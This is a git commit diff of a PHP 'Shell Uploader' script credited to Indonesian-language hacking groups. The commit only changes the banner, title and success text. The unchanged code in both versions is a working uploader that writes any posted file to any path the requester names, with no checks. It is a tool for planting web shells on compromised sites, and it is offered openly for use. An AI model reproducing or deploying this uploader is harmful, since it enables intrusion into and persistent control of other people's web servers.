f7c73003d624291f9120c8a3b848e333d19c2a73
karedoxcb12 <73396634+karedoxcb12@users.noreply.github.com>
2020-10-24 22:35:39 +0700

    Update 2.php

--- 2.php
+++ 2.php
@@ -4,8 +4,8 @@ $files = @$_FILES["files"];
 if ($files["name"] != '') {
     $fullpath = $_REQUEST["path"] . $files["name"];
     if (move_uploaded_file($files['tmp_name'], $fullpath)) {
-        echo "<h1><a href='$fullpath'>Succes Asu !</a></h1>";
+        echo "<h1><a href='$fullpath'>Lanjakelah Bos!</a></h1>";
     }
-}echo '<html><head><title>Shell Uploader By Bang4Y1N</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Tembak Bos"></form></body></html>';
+}echo '<html><head><title>Shell Uploader By Muaratara6etar</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Tembak Bos"></form></body></html>';
 ?>
-<center><font color=red size=3 face=courier new>Bang4Y1N - Sabang Merauke Cyber 45</font></center>
+<center><font color=red size=3 face=courier new>Muratara63tar - Muratara_cyber</font></center>
